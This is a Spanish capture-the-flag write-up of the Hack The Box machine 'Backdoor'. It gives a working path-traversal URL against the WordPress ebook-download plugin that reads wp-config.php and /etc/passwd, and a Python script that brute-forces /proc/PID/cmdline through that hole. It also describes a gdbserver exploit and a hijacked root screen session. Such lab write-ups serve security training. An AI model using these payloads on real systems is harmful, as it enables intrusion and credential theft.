---
layout: single
title: Backdoor - Hack The Box
excerpt: "En esta máquina fácil nos estaremos aprovechando del plugin de WordPress **ebook-download** para explotar un **Local File Inclusion** y así poder descubrir el comando **gdbserver** en la ruta **/proc/**. Después, explotaremos una vulnerabilidad de dicho servicio con la que obtendremos acceso a la maquina víctima. Una vez dentro, encontraremos una sesión de screen **activa** y al conectarnos estaremos como root"
date: 2023-09-08
classes: wide
header:
  teaser: /assets/images/htb-writeup-backdoor/backdoor_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
tags:
  - Linux
  - Wordpress
  - Local File Inclusion
  - Scripting en python
  - gdbserver exploit
  - Sesión con screen
---

![](/assets/images/htb-writeup-backdoor/backdoor_logo.png)

# Enumeración
Puertos abiertos:
![](/assets/images/htb-writeup-backdoor/escaner_nmap_backdoor.png)

Al hacer click en **Home** vemos que nos redirige a **backdoor.htb** por lo que tendremos que añadir esa ruta en el **/etc/hosts**. Esto nos puede hacer pensar que hay más subdominios pero si hacemos un escaneo nos daremos cuenta de que no encontramos ninguno.

Al tratarse de un **Wordpress** debemos echarle un ojo a la ruta **/wp-content/plugins/** que es donde residen los plugins y de los cuales nos podemos aprovechar para encontrar vulnerabilidades.
![](/assets/images/htb-writeup-backdoor/wordpress_plugins_backdoor.png)
<br>Tenemos capacidad de **Directory Listing**, esto es una gran noticia ya que nos facilita mucho la tarea. Encontramos el plugin de **ebook-download** y si miramos el **readme.txt** podemos encontrar la versión que se está utilizando.
![](/assets/images/htb-writeup-backdoor/version_ebook_download.png)
<br>Realizando una rápida búsqueda con **searchsploit** nos damos cuenta de que hay un **Directory Traversal** asociado a este plugin el cual nos va a permitir realizar un **Local File Inclusion**.
![](/assets/images/htb-writeup-backdoor/searchsploit_ebook_download.png)
**PoC:** /wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php

Con esto podemos leer el **/etc/passwd** y darnos cuenta de que existe el usuario **user** pero si intentamos leer la **id_rsa** en la ruta **/home/user/.ssh/id_rsa** no obtendremos nada. Otra cosa que podriamos realizar es leer el **/etc/hosts** para ver si tiene algún subdominio que no hayamos detectado en un primer momento pero no obtendremos gran cosa. Después de probar con varias rutas más encontramos **/proc** pero, ¿Para que se usa esta ruta?

Cuando nosotros ejecutamos un proceso, por ejemplo: **nc -lvnp 4444**<br>
Y posteriormente lo ponemos en segundo plano con: **ctrl + z** y listamos su **PID** con ps.<br>
El comando se guardará en la ruta **/proc/PID/cmdline** y podremos leerlo. Por lo que sería una idea interesante **aplicar un ataque de fuerza bruta a esas rutas** para ello crearemos el siguiente script en python3:
```python
#!/usr/bin/python3

import requests, signal, sys, pdb, time
from pwn import *

def def_handler(sig, frame):
    print("\n\n[!] Saliendo.....\n")
    sys.exit(1)

# Ctrl + C
signal.signal(signal.SIGINT, def_handler)

main_url="http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl="

def bruteForce():

    p1 = log.progress("Iniciando fuerza bruta: ")
    p1.status("Empezando ataque de fuerza bruta: ")
    
    time.sleep(5)
    for i in range(0,10000):
        
        p1.status("Probando con la ruta: /proc/%s/cmdline " % str(i))

        full_url = main_url + "/proc/" + str(i) + "/cmdline"
        r = requests.get(full_url)
        if len(r.content) > 82:
            print("-----------------------------------------------------------------------------------")
            log.info("Ruta: /proc/%s/cmdline" % str(i))
            log.info("Longitud total: %s" % len(r.content))
            output = r.text.replace('/proc/'+str(i)+'/cmdline','').replace('<script>window.close()</script>','').replace('\x00','')
            log.info(output)
            print("-----------------------------------------------------------------------------------")

if __name__ == '__main__':
    
    bruteForce()

```
Gracias a esto encontraremos la siguiente información:
![](/assets/images/htb-writeup-backdoor/brute_force_information.png)
## Explotación de gdbserver
### ¿Qué es gdbserver?
Es un programa informático usado para la depuración remota de otros programas. Se ejecuta en el mismo sistema que el programa que se va a depurar, esto permite que el programa **(GDB)** se conecte desde otro sistema, es decir, sólo es necesario que el ejecutable a depuerar resida en el sistema destino **"target"**, mientras que el código fuente y una copia del archivo binario a depurar residen en el ordenador local del desarrollador **"host"**. La conexión puede ser TCP o una línea de serie.
### ¿Cómo lo explotamos?
Detectamos que **gdbserver** esta gestionando el puerto **1337**. Buscando vulnerabilidades de gdbserver con **searchsploit** encontraremos una. El funcionamiento del exploit sería el siguiente:
![](/assets/images/htb-writeup-backdoor/uso_del_exploit.png)
<br>Por lo que siguiendo esos pasos lograriamos entrar en la máquina Backdoor como el usuario **user**
![](/assets/images/htb-writeup-backdoor/exploit_funcionando.png)
## Escalada de Privilegios 
Antes, al hacer el ataque de fuerza bruta hemos detectado otro proceso relacionado con **screen**. Lo podiamos haber descubierto tambien con **pspy:** [Descargar pspy:](https://github.com/DominicBreuker/pspy) 
![](/assets/images/htb-writeup-backdoor/escaner_pspy.png)
<br>**¿Qué es el comando screen?**
<br>El comando screen es una herramienta de terminal que permite crear y controlar múltiples sesiones de terminal en una sola terminal. Es muy parecida a **tmux**.<br>
La linea de comandos que se esta ejecutando quiere decir que si la ruta **/var/run/screen/S-root/** está vacía se va a ejecutar una sesión con screen llamada root.<br>
Por lo que podriamos conectarnos a esa sesión con el siguiente comando:
```bash
screen -x root/
```
Importante poner la / del final. Destacar también que las sesiones activas se guardan en la ruta **/run/screen/S-{nombre_usuario}**.

Hecho esto habriamos entrado a esa sesión como **root** y tendriamos control total sobre la máquina **Backdoor**
